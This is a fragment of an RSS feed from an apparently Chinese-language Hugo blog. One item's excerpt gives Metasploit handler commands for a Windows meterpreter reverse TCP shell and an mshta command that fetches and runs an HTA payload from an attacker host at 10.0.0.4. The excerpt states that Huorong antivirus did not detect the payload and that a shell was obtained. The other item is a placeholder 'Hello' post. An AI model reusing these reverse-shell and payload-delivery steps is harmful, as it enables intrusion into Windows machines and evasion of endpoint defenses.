sudo msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.0.0.4 set lport 443 #开启443需要root权限 run Windows Server 2008 开启cmd执行mshta http://10.0.0.4:8888/2.hta，火绒不拦截也未检测出2.hta为恶意payload，kali获得shell
其他 hta脚本静态查杀情况 原始脚本1.</description>
    </item>
    
    <item>
      <title>Hello</title>
      <link>https://gokarna-hugo.netlify.app/posts/2021/first-post/</link>
      <pubDate>Fri, 01 Jan 2021 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2021/first-post/</guid>
      <description>[TOC]
hello
anything
one a b aa bb two aaa
image </description>
    </item>
    
  </channel>
</rss>
